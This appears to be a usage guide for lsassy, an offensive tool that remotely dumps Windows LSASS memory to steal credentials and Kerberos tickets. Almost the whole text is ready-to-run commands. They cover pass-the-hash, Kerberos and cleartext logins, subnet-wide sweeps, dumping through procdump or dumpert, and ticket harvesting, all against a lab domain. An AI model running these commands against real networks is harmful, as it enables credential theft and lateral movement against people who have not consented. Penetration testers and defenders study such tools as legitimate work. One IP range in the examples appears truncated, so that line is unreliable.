
#### Basic Usage

 lsassy -u Administrator -H {Hash} -d {domain} {IP} --users
lsassy [-d domain] -u pixis -p P4ssw0rd targets
lsassy [-d domain] -u pixis -H [LM:]NT targets

#### Kerberos
- **lsassy** can authenticate with Kerberos. It requires a valid TGT in `KRB5CCNAME`environment variable. See [advanced usage](https://github.com/Hackndo/lsassy/blob/master/Lsassy-Advanced-Usage#kerberos) for more details.
lsassy -k targets

#### Examples
```
 lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/24
 lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-10
 lsassy -d hackn.lab -u pixis -p P4ssw0rd hosts.txt
 lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-192.168.1.

lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -m procdump    -O procdump_path=/opt/Sysinternals/procdump.exe
lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -m dumpert     -O dumpert_path=/opt/dumpert.exe
lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -m dumpertdll  -O dumpertdll_path=/opt/dumpert.dll
```

#### Kerberos tickets harvesting
- Kerberos tickets will be extracted and saved to `$HOME/.config/lsassy/tickets` in `kirbi` format. You can specify output directory using `-K [directory]` or `--kerberos-dir [directory]` parameter. If this directory doesn't exist, the tool will attempt to create it before outputing tickets.

lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -K '/tmp/kerberos_tickets'

### Authentication methods
- There are three different ways to authenticate against remote targets using **lsassy**. The only requirement is that the user needs to have local administration rights on the remote targets.

#### Cleartext credentials
```
## Local user
lsassy -u pixis -p P4ssw0rd server01.hackn.lab

## Domain user
lsassy -d hackn.lab -u jsnow -p WinterIsComing server01.hackn.lab
```

#### Pass-the-hash
```
lsassy -d hackn.lab -u jsnow -H 38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab
aad3b435b51404eeaad3b435b51404ee

## Or

lsassy -d hackn.lab -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab
```

If you don't want tickets to be exported, you can use `--no-tickets` flag

You can decide how many thread you want to use [1-256] using `--threads`parameter.